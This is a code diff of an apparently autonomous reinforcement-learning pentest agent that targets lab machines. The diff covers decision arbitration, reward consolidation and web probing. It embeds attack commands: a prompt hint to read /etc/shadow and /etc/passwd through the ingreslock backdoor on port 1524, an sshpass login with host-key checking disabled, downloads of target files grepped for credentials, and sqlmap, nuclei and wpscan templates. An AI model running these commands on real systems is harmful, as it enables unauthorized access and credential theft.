                 f"sshpass -p '{_disc_pass}' ssh -o StrictHostKeyChecking=no {_disc_user}@{target} 'id; whoami; uname -a'",
@@ -5400,6 +5295,305 @@ class SmartCoach:
         valid = len(reasons) == 0 or all("allowed" in r for r in reasons)
         return valid, reasons
 
+    # =====================================================================
+    # P1: Decision Sovereignty — Single Arbitration Method
+    # =====================================================================
+
+    def _p1_arbitrate_decision(
+        self,
+        step_ctx: "SmartStepContext",
+        proposed_action: Optional[str],
+        confidence: float,
+        skill_result: Optional["SmartDecisionResult"],
+        playbook_result: Optional["SmartDecisionResult"],
+        micro_chain_result: Optional["SmartDecisionResult"],
+        phase_guided_result: Optional["SmartDecisionResult"],
+        codex_meta_result: Optional["SmartDecisionResult"],
+        cognition_decision: Optional["SmartDecisionResult"],
+        filtered_commands: Optional[List] = None,
+        discovery_board: Optional[Dict[str, Any]] = None,
+        gpt_available: bool = False,
+        should_call_gpt: bool = False,
+        mentor_engagement: Any = None,
+        gpt_reason: str = "",
+    ) -> Optional["SmartDecisionResult"]:
+        """P1: Decision Sovereignty — single arbitration via DecisionCore.
+
+        All source producers have already run and produced their results.
+        This method:
+        1. Computes deferred sources (web_followup, hypothesis)
+        2. Always runs PPO for trajectory building
+        3. Gates mentor call via MaturityController
+        4. Collects ALL non-None results as Advisory objects
+        5. Calls DecisionCore.arbitrate() to pick the single winner
+        6. Creates TeacherTrace if mentor was called
+
+        Returns:
+            SmartDecisionResult from the winning advisory, or None if
+            all sources failed (triggers null-safety fallback in caller).
+        """
+        if discovery_board is None:
+            discovery_board = {}
+
+        # ── 1. Compute deferred sources ──────────────────────────────
+        web_followup = self._web_path_followup(step_ctx, discovery_board)
+        hyp_result = self._p14_hypothesis_select(step_ctx, filtered_commands)
+
+        # ── 2. Always run PPO for trajectory building ────────────────
+        _ppo_result: Optional[SmartDecisionResult] = None
+        if self.ppo_agent and self.action_mapper:
+            _ppo_result = self._ppo_select_command(step_ctx, filtered_commands)
+
+        # ── 3. Gate mentor call via MaturityController ───────────────
+        _mentor_result: Optional[SmartDecisionResult] = None
+        _mentor_called = False
+        if gpt_available and should_call_gpt:
+            _call_mentor = False
+            if self._maturity_controller is not None:
+                _call_mentor = self._maturity_controller.should_call_mentor(
+                    self.agent_name
+                )
+            else:
+                # Fallback: 30% base rate when MaturityController unavailable
+                import random as _rand
+                _call_mentor = _rand.random() < 0.30
+
+            if _call_mentor:
+                _mentor_called = True
+                if mentor_engagement is not None and getattr(
+                    mentor_engagement, "engage", False
+                ):
+                    orig_model = self.model
+                    self.model = mentor_engagement.model
+                    _exfil_hint = (
+                        "Focus on data exfiltration via ingreslock backdoor. Try: "
+                        "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet "
+                        "target 1524, { echo 'base64 /etc/passwd'; sleep 2; } | "
+                        "timeout 10 telnet target 1524."
+                    ) if getattr(mentor_engagement, "exfil_guidance", False) else None
+                    _mentor_result = self._decide_with_mentor(
+                        step_ctx, proposed_action, confidence, filtered_commands,
+                        exfil_prompt=_exfil_hint,
+                    )
+                    self.model = orig_model
+                else:
+                    _mentor_result = self._decide_with_mentor(
+                        step_ctx, proposed_action, confidence, filtered_commands,
+                    )
+
+        # ── 4. Registry fallback advisory ────────────────────────────
+        _registry_result = self._decide_from_registry(
+            step_ctx, proposed_action, confidence
+        )
+
+        # ── 5. Collect all advisories ────────────────────────────────
+        # Fallback: if DecisionCore is None, return first non-None result
+        if self._decision_core is None:
+            for _fb in [
+                skill_result, web_followup, playbook_result,
+                micro_chain_result, phase_guided_result, codex_meta_result,
+                cognition_decision, hyp_result,
+                _mentor_result if _mentor_result and getattr(
+                    _mentor_result, "mentor_call", False
+                ) else None,
+                _ppo_result, _registry_result,
+            ]:
+                if _fb is not None and getattr(_fb, "command", None):
+                    return _fb
+            return _registry_result
+
+        from core.decision.decision_core import Advisory
+
+        _source_pairs = [
+            ("skill", skill_result),
+            ("followup", web_followup),
+            ("playbook", playbook_result),
+            ("micro_chain", micro_chain_result),
+            ("phase_guided", phase_guided_result),
+            ("codex_meta", codex_meta_result),
+            ("cognition", cognition_decision),
+            ("hypothesis", hyp_result),
+            ("ppo", _ppo_result),
+            (
+                "mentor",
+                _mentor_result
+                if _mentor_result
+                and getattr(_mentor_result, "mentor_call", False)
+                else None,
+            ),
+            ("registry", _registry_result),
+        ]
+
+        _advisories: List[Advisory] = []
+        _result_map: Dict[str, SmartDecisionResult] = {}
+
+        # Compute novelty: commands already used this episode get low novelty
+        _used = getattr(self, 'episode_used_commands', set())
+
+        for _src_name, _src_res in _source_pairs:
+            if _src_res is not None and getattr(_src_res, "command", None):
+                _cmd = _src_res.command or ""
+                # Novel if command (or its first 40 chars) not in used set
+                _cmd_prefix = _cmd[:40]
+                _is_novel = (
+                    _cmd not in _used
+                    and not any(_cmd_prefix == u[:40] for u in _used)
+                )
+                _advisories.append(
+                    Advisory(
+                        source=_src_name,
+                        command=_cmd,
+                        template_name=getattr(_src_res, "template_name", "") or "",
+                        confidence=getattr(_src_res, "confidence", 0.5),
+                        phase_fit=0.7,
+                        novelty=0.8 if _is_novel else 0.05,
+                        metadata={"source_key": _src_name},
+                    )
+                )
+                _result_map[_src_name] = _src_res
+
+        if not _advisories:
+            return _registry_result
+
+        # ── 6. Get maturity + win rates + RND novelty ────────────────
+        _maturity = 0.0
+        if self._maturity_controller is not None:
+            _ms = getattr(self._maturity_controller, "state", None)
+            if _ms is not None:
+                _maturity = getattr(_ms, "maturity", 0.0)
+
+        _win_rates: Dict[str, float] = {}
+        if hasattr(self, "source_win_rate") and self.source_win_rate is not None:
+            for _wr_name, _wr_stats in self.source_win_rate.get_summary().items():
+                _win_rates[_wr_name] = _wr_stats.get("ema_win_rate", 0.5)
+
+        _rnd_novelty = 0.0
+        _dp = self._current_decision_packet
+        if _dp is not None and hasattr(_dp, "rnd") and getattr(
+            _dp.rnd, "valid", False
+        ):
+            _rnd_novelty = getattr(_dp.rnd, "intrinsic_reward", 0.0)
+
+        # ── 7. Arbitrate ─────────────────────────────────────────────
+        _stagnation = getattr(self, '_stagnation_steps', 0)
+        _arb = self._decision_core.arbitrate(
+            _advisories,
+            constraints=[],
+            maturity=_maturity,
+            rnd_novelty=_rnd_novelty,
+            source_win_rates=_win_rates,
+            stagnation_steps=_stagnation,
+        )
+
+        # ── 8. Convert ArbitrationResult → SmartDecisionResult ───────
+        _winner_src = _arb.source
+        result = _result_map.get(_winner_src)
+
+        if result is None:
+            # Winning source not in result map — construct from ArbitrationResult
+            result = SmartDecisionResult(
+                command=_arb.command,
+                template_name=_arb.template_name,
+                source=_winner_src,
+                confidence=_arb.confidence,
+            )
+
+        # ── 9. Mentor suggestion for PPO imitation tracking ──────────
+        if _mentor_result is not None and getattr(
+            _mentor_result, "mentor_call", False
+        ):
+            result._mentor_suggestion = _mentor_result.template_name
+
+        # ── 10. TeacherTrace: mentor as teacher, PPO as student ──────
+        if (
+            _mentor_called
+            and _mentor_result is not None
+            and getattr(_mentor_result, "mentor_call", False)
+            and _ppo_result is not None
+            and self._p14_bc_buffer is not None
+        ):
+            try:
+                from core.reasoning.teacher_trace import TeacherTrace
+
+                _state_id = f"ep{self.current_episode}_s{step_ctx.step}"
+                _teacher_action_idx = 0
+                if self.action_mapper and _mentor_result.template_name:
+                    try:
+                        _teacher_action_idx = self.action_mapper.command_to_action(
+                            _mentor_result.template_name
+                        )
+                        if _teacher_action_idx < 0:
+                            _teacher_action_idx = 0
+                    except Exception:
+                        _teacher_action_idx = 0
+
+                _student_action_idx = (
+                    self._ppo_pending.get("action", 0)
+                    if self._ppo_pending
+                    else 0
+                )
+                _student_log_prob = (
+                    self._ppo_pending.get("log_prob", 0.0)
+                    if self._ppo_pending
+                    else 0.0
+                )
+
+                _tt = TeacherTrace(
+                    state_id=_state_id,
+                    state_vector=(
+                        self._ppo_pending.get("state", [])
+                        if self._ppo_pending
+                        else []
+                    ),
+                    teacher_action_idx=_teacher_action_idx,
+                    teacher_command=_mentor_result.command or "",
+                    teacher_template=_mentor_result.template_name or "",
+                    rationale=_mentor_result.mentor_reasoning or "",
+                    confidence=_mentor_result.confidence,
+                    student_action_idx=_student_action_idx,
+                    student_command=getattr(_ppo_result, "command", "") or "",
+                    student_template=getattr(
+                        _ppo_result, "template_name", ""
+                    ) or "",
+                    student_log_prob=_student_log_prob,
+                    student_confidence=getattr(
+                        _ppo_result, "confidence", 0.0
+                    ),
+                    episode=self.current_episode,
+                    step=step_ctx.step,
+                    agent_id=self.agent_name,
+                    phase=str(getattr(step_ctx, "phase", "RECON")),
+                )
+                self._p14_bc_buffer.store(_tt)
+                self._p14_traces_this_episode.append(_tt)
+                logger.debug(
+                    f"[P1] TeacherTrace: div={_tt.compute_divergence():.1f} "
+                    f"teacher={_mentor_result.template_name} "
+                    f"student={_ppo_result.template_name}"
+                )
+            except Exception as e:
+                logger.debug(f"[P1] TeacherTrace creation failed: {e}")
+
+        # ── 11. Log arbitration trace ────────────────────────────────
+        self._step_reasoning_log.append(
+            {
+                "event": "p1_arbitration",
+                "winner": _winner_src,
+                "advisories": len(_advisories),
+                "scores": {
+                    k: round(v, 4) for k, v in _arb.all_scores.items()
+                },
+                "maturity": round(_maturity, 3),
+            }
+        )
+
+        logger.debug(
+            f"[P1][{self.agent_name}] Arbitrated: winner={_winner_src} "
+            f"n={len(_advisories)} maturity={_maturity:.3f}"
+        )
+
+        return result
+
     def _decide_from_registry(
         self,
         step_ctx: SmartStepContext,
@@ -5639,10 +5833,10 @@ class SmartCoach:
                     (f"sqlmap -u 'http://{ctx.target}/login.php' --forms --batch", "sqlmap_forms", "⚔️ SQLi form test"),
                     (f"sqlmap -u 'http://{ctx.target}/search?q=1' --batch", "sqlmap_search", "⚔️ SQLi search test"),
                     # Vuln scanning (different templates)
-                    (f"nuclei -u http://{ctx.target} -t cves/ -severity critical", "nuclei_cve", "⚔️ CVE scan"),
-                    (f"nuclei -u http://{ctx.target} -t vulnerabilities/", "nuclei_vuln", "⚔️ Vuln templates"),
-                    (f"nuclei -u http://{ctx.target} -t exposed-panels/", "nuclei_panels", "⚔️ Exposed panels"),
-                    (f"nuclei -u http://{ctx.target} -t misconfigurations/", "nuclei_misconfig", "⚔️ Misconfigs"),
+                    (f"nuclei -u http://{ctx.target} -as -severity critical", "nuclei_cve", "⚔️ CVE auto-scan"),
+                    (f"nuclei -u http://{ctx.target} -as -severity high,critical", "nuclei_vuln", "⚔️ Vuln scan"),
+                    (f"nuclei -u http://{ctx.target} -as -tags panel", "nuclei_panels", "⚔️ Exposed panels"),
+                    (f"nuclei -u http://{ctx.target} -as -tags misconfig", "nuclei_misconfig", "⚔️ Misconfigs"),
                     # CMS specific
                     (f"wpscan --url http://{ctx.target} --enumerate u", "wpscan_users", "⚔️ WP user enum"),
                     (f"wpscan --url http://{ctx.target} --enumerate vp", "wpscan_plugins", "⚔️ WP vuln plugins"),
@@ -6287,15 +6481,84 @@ class SmartCoach:
             return None
         
         web_paths = discovery_board.get("web_paths", set())
+        services = discovery_board.get("services", set())
+        target = discovery_board.get("target", getattr(step_ctx.attack_context, "target", ""))
+        if not target:
+            return None
+
+        # ── P51: Homepage + common-paths probes when HTTP found ──────────
+        # These probes fire ONCE per engagement regardless of existing
+        # web_paths.  Previous P50 logic gated on `not web_paths`, but
+        # early ffuf/gobuster runs populate web_paths with noise (/_/,
+        # /___/, /sec), preventing the probes from running.
+        # Critical: Cap's /data/N IDOR path is only discoverable from
+        # homepage links or common-path probe — NOT from directory brute-force.
+        if "http" in services or "https" in services:
+            if not hasattr(self, '_initial_web_probe_done'):
+                self._initial_web_probe_done = False
+            if not hasattr(self, '_common_paths_probed'):
+                self._common_paths_probed = False
+            ctx = step_ctx.attack_context
+            current_phase = ctx.current_phase if ctx else None
+
+            if not self._initial_web_probe_done:
+                self._initial_web_probe_done = True
+                cmd = (
+                    f"curl -sL http://{target}/ | head -200; "
+                    f"echo '---HREFS---'; "
+                    f"curl -sL http://{target}/ | grep -oiE 'href=\"[^\"]+\"' | sort -u"
+                )
+                self._step_reasoning_log.append({
+                    "event": "web_followup_homepage",
+                    "detail": "Initial homepage probe + link extraction",
+                })
+                return SmartDecisionResult(
+                    command=cmd,
+                    source="web_followup",
+                    confidence=0.90,
+                    template_name="curl_homepage",
+                    params={"target": target},
+                    reasoning="[WEB_FOLLOWUP] Homepage probe + link extraction (HTTP found, no web paths yet)",
+                    phase=current_phase,  # type: ignore[arg-type]
+                    mentor_call=False,
+                )
+
+            if not self._common_paths_probed:
+                self._common_paths_probed = True
+                # P51: Also probe FTP (port 21) which PPO often misses
+                # in initial nmap. Cap and many HTB boxes have FTP.
+                _ports = discovery_board.get("ports", set())
+                _ftp_probe = ""
+                if 21 not in _ports and "21" not in {str(p) for p in _ports}:
+                    _ftp_probe = f"nmap -sV -p 21 {target}; echo '---FTP_PROBE_DONE---'; "
+                cmd = (
+                    f"{_ftp_probe}"
+                    f"for p in data data/0 data/1 download download/0 capture files api admin dashboard; do "
+                    f"code=$(curl -sL -o /dev/null -w '%{{http_code}}' http://{target}/$p/); "
+                    f"echo \"/$p/ → $code\"; done"
+                )
+                self._step_reasoning_log.append({
+                    "event": "web_followup_common_paths",
+                    "detail": "Probing common CTF/pentest paths",
+                })
+                return SmartDecisionResult(
+                    command=cmd,
+                    source="web_followup",
+                    confidence=0.85,
+                    template_name="curl_common_paths",
+                    params={"target": target},
+                    reasoning="[WEB_FOLLOWUP] Probing common paths (/data, /download, /capture, etc.)",
+                    phase=current_phase,  # type: ignore[arg-type]
+                    mentor_call=False,
+                )
+
+            # Both probes done — fall through to main web_followup logic
+
         if not web_paths:
             logger.debug(
                 f"[WEB_FOLLOWUP][{self.agent_name}] No web_paths in board. "
                 f"keys={list(discovery_board.keys())} wp={discovery_board.get('web_paths', 'MISSING')}"
             )
-            return None
-        
-        target = discovery_board.get("target", getattr(step_ctx.attack_context, "target", ""))
-        if not target:
             return None
         
         # Track which paths have been followed up
@@ -6398,6 +6661,13 @@ class SmartCoach:
                     f"echo \"=== /download/$i ===\"  && "
                     f"file /tmp/dl_$i && "
                     f"strings /tmp/dl_$i 2>/dev/null | "
+                    f"grep -iE 'USER|PASS|230|331|login|ftp' | head -10; "
+                    f"done; "
+                    f"for i in 0 1 2 3; do "
+                    f"wget -q http://{target}/data/$i -O /tmp/data_$i 2>/dev/null && "
+                    f"echo \"=== /data/$i ===\"  && "
+                    f"file /tmp/data_$i && "
+                    f"strings /tmp/data_$i 2>/dev/null | "
                     f"grep -iE 'USER|PASS|230|331|login|ftp' | head -10; "
                     f"done"
                 )
@@ -7476,6 +7746,18 @@ class SmartCoach:
                     "value_reg": metrics.get("value_reg_grad_norm", 0.0),
                     "contrastive": metrics.get("contrastive_grad_norm", 0.0),
                 }
+
+                # ── P7: Feed gradient norms to HarmonyMetrics ──
+                if self._harmony_metrics is not None:
+                    self._harmony_metrics.record_gradient_norms(
+                        self._last_grad_norms
+                    )
+
+                # ── P7: Feed KL drift to HarmonyMetrics ──
+                if self._harmony_metrics is not None:
+                    _kl_val = metrics.get("approx_kl", 0.0)
+                    if _kl_val > 0:
+                        self._harmony_metrics.record_kl_drift(_kl_val)
             
             # ── R58 Layer 2c: Signal episode outcome for adaptive entropy ──
             if hasattr(self.ppo_agent, 'signal_episode_outcome'):
@@ -7866,6 +8148,38 @@ class SmartCoach:
                 if self._p16_progress_estimate else 0.0
             ),
         )
+
+        # =====================================================================
+        # STRUCTURAL CONSOLIDATION: Unified Reward Pipeline
+        # Route ALL reward through UnifiedRewardPipeline so every learner
+        # receives the same scalar. RND intrinsic is added here once.
+        # =====================================================================
+        _unified_reward = None
+        _rnd_intrinsic_for_pipeline = 0.0
+        _rnd_scale_for_pipeline = 1.0
+        _dp = getattr(self, '_current_decision_packet', None)
+        if _dp is not None and hasattr(_dp, 'rnd') and _dp.rnd.valid:
+            _rnd_intrinsic_for_pipeline = _dp.rnd.intrinsic_reward
+            _rnd_scale_for_pipeline = getattr(
+                self._maturity_controller, '_state', None
+            )
+            if _rnd_scale_for_pipeline is not None:
+                _rnd_scale_for_pipeline = getattr(
+                    _rnd_scale_for_pipeline, 'rnd_scale', 1.0
+                )
+            else:
+                _rnd_scale_for_pipeline = 1.0
+
+        if self._reward_pipeline is not None:
+            _unified_reward = self._reward_pipeline.compute(
+                breakdown=breakdown,
+                rnd_intrinsic=_rnd_intrinsic_for_pipeline,
+                rnd_scale=_rnd_scale_for_pipeline,
+            )
+
+        # Track reward in HarmonyMetrics
+        if self._harmony_metrics is not None:
+            self._harmony_metrics.record_reward(breakdown.total)
         
         # D2: Populate discovery_details for _emit_step_event tracking
         if new_discoveries:
@@ -8198,76 +8512,12 @@ class SmartCoach:
                     self._reasoning_failures = self._reasoning_failures[-10:]
 
         # ─── PHASE 4: Pair PPO trajectory entry with reward ─────────
+        # STRUCTURAL REWRITE: All learners receive the same unified reward.
+        # Per-algorithm bonuses (conformity, DAgger, macro-align, reasoning,
+        # RND) are REMOVED. UnifiedRewardPipeline.total is the single scalar.
         if self._ppo_pending is not None:
-            ppo_reward = breakdown.total
-            
-            # PHASE 6: Mentor imitation bonus — when mentor was consulted and
-            # PPO independently chose the same template, add conformity bonus.
-            # This bridges supervised learning (mentor) with RL (PPO).
-            # Phase 13.0: +67% bonus (3.0→5.0) — stronger imitation signal
-            mentor_suggestion = getattr(decision, '_mentor_suggestion', None)
-            if mentor_suggestion and decision.source == "ppo":
-                if decision.template_name == mentor_suggestion:
-                    ppo_reward += 5.0  # Phase 13.0: Conformity bonus: PPO agrees with expert
-                    logger.debug(
-                        f"[PPO][{self.agent_name}] Mentor conformity bonus +5.0 "
-                        f"(both chose {decision.template_name})"
-                    )
-            
-            # Phase 6.4 + Phase 13.0: When MENTOR led the decision but PPO had a shadow
-            # trajectory, give PPO the mentor's reward (clipped) so it learns
-            # what good decisions look like. This is DAgger-lite.
-            # Phase 13.0: Floor raised 1.0→2.0 for stronger supervised signal
-            if mentor_suggestion and decision.source == "mentor":
-                # PPO ran in shadow mode — give it the same reward signal
-                # so its gradient points toward the mentor's behavior
-                ppo_reward = max(breakdown.total, 2.0)  # Phase 13.0: At least +2 for mentor demos
-                logger.debug(
-                    f"[PPO][{self.agent_name}] DAgger-lite: PPO shadow learns from "
-                    f"mentor decision (reward={ppo_reward:.1f})"
-                )
-            
-            # ── R58 Layer 2a: Macro-aligned PPO reward shaping ──────
-            # When DDQN selects a macro-intent and PPO picks a command,
-            # reward PPO for choosing commands within the macro's allowed
-            # set. This teaches PPO to follow DDQN's strategic direction.
-            if self._active_macro is not None and decision.template_name:
-                try:
-                    from core.algorithms.ddqn_macro import MACRO_COMMAND_MAP
-                    macro_cmds = MACRO_COMMAND_MAP.get(self._active_macro, set())
-                    if decision.template_name in macro_cmds:
-                        ppo_reward += 4.0  # Phase 13.0: +33% (was 3.0) — stronger macro alignment
-                        logger.debug(
-                            f"[PPO][{self.agent_name}] R58 macro-align +4.0 "
-                            f"({decision.template_name} ∈ {self._active_macro.name})"
-                        )
-                    else:
-                        ppo_reward -= 1.0  # Gentle misalignment penalty
-                        logger.debug(
-                            f"[PPO][{self.agent_name}] R58 macro-misalign -1.0 "
-                            f"({decision.template_name} ∉ {self._active_macro.name})"
-                        )
-                except Exception:
-                    pass  # DDQN not available — skip alignment shaping
-            
-            # ── Phase 13.0: Reasoning Reward Channel ────────────────
-            # When the agent's command produced actual discoveries, boost PPO
-            # reward proportional to discovery count. This teaches PPO that
-            # commands which produce actionable intelligence are valuable.
-            if new_discoveries:
-                _disc_count = 0
-                for _dk, _dv in new_discoveries.items():
-                    if isinstance(_dv, (list, set)):
-                        _disc_count += len(_dv)
-                    elif _dv:
-                        _disc_count += 1
-                if _disc_count > 0:
-                    _reasoning_bonus = min(_disc_count * 1.5, 8.0)  # Cap at +8.0
-                    ppo_reward += _reasoning_bonus
-                    logger.debug(
-                        f"[PPO][{self.agent_name}] Phase 13.0 reasoning bonus +"
-                        f"{_reasoning_bonus:.1f} ({_disc_count} discoveries)"
-                    )
+            # Use unified reward if available, else fallback to breakdown.total
+            ppo_reward = _unified_reward.total if _unified_reward is not None else breakdown.total
             
             # ── Phase 13.0: Auto-promote high-reward mentor commands to SkillLibrary ──
             # When a mentor-suggested command produces reward > 5.0, it's a proven
@@ -8308,21 +8558,13 @@ class SmartCoach:
                     else:
                         _r69_disc_types.append(_dt)
 
-            # C02: Inject RND intrinsic reward into PPO trajectory
-            # DecisionPacket carries per-step RND signal computed pre-step.
-            # This gives PPO exploration credit for visiting novel states.
-            _rnd_intrinsic = 0.0
+            # STRUCTURAL REWRITE: RND intrinsic is already folded into
+            # unified_reward.total. No separate PPO RND injection needed.
+            # Populate reward composition on packet for telemetry only.
             _dp = self._current_decision_packet
             if _dp is not None and hasattr(_dp, 'rnd') and _dp.rnd.valid:
-                _rnd_intrinsic = _dp.rnd.intrinsic_reward
-                ppo_reward += _rnd_intrinsic
-                # Also populate reward composition on the packet
-                _dp.reward.intrinsic_rnd = _rnd_intrinsic
+                _dp.reward.intrinsic_rnd = _dp.rnd.intrinsic_reward
                 _dp.reward.extrinsic = breakdown.total
-                logger.debug(
-                    f"[PPO][{self.agent_name}] C02 RND intrinsic +"
-                    f"{_rnd_intrinsic:.3f} → ppo_reward={ppo_reward:.2f}"
-                )
 
             self._ppo_trajectory.append({
                 "state": self._ppo_pending["state"],
@@ -8378,11 +8620,8 @@ class SmartCoach:
                     current_step=_sac_step_num + 1,
                     max_steps=500,
                 )
-                # Use the same shaped reward as PPO (extrinsic + RND)
-                _sac_reward = breakdown.total
-                _dp = self._current_decision_packet
-                if _dp is not None and hasattr(_dp, 'rnd') and _dp.rnd.valid:
-                    _sac_reward += _dp.rnd.intrinsic_reward
+                # STRUCTURAL REWRITE: Unified reward for all learners
+                _sac_reward = _unified_reward.total if _unified_reward is not None else breakdown.total
 
                 self.sac_agent.store_transition(
                     state=self._sac_pending["state"],
@@ -8433,7 +8672,7 @@ class SmartCoach:
                     
                     macro_reward = compute_macro_reward(
                         macro=self._active_macro,  # type: ignore[arg-type]
-                        step_reward=breakdown.total,
+                        step_reward=_unified_reward.total if _unified_reward is not None else breakdown.total,
                         phase_name=phase_name,
                         discoveries=new_discoveries or {},
                         prev_phase=prev_phase_name,
@@ -8471,7 +8710,7 @@ class SmartCoach:
                     current_step=len(self._ppo_trajectory) if self._ppo_trajectory else 1,
                     max_steps=500,
                 )
-                _cog_reward = breakdown.total
+                _cog_reward = _unified_reward.total if _unified_reward is not None else breakdown.total
                 self.cognition_node.observe(
                     self._cognition_result, _cog_reward, _cog_next, done,
                 )
@@ -8511,7 +8750,7 @@ class SmartCoach:
                     hm.store_transition(
                         state=_hm_state_np,
                         action=_hm_action,
-                        reward=breakdown.total,
+                        reward=_unified_reward.total if _unified_reward is not None else breakdown.total,
                         next_state=_hm_state_np,  # Current state (next will overwrite on next step)
                         done=done,
                         metadata={
@@ -8523,7 +8762,7 @@ class SmartCoach:
                                       if self.attack_context and self.attack_context.current_phase
                                       else "RECON"),
                         },
-                        priority=abs(breakdown.total) + 0.01,
+                        priority=abs(_unified_reward.total if _unified_reward is not None else breakdown.total) + 0.01,
                     )
             except Exception as e:
                 logger.debug(f"[HYBRID_MEM][{self.agent_name}] store failed: {e}")
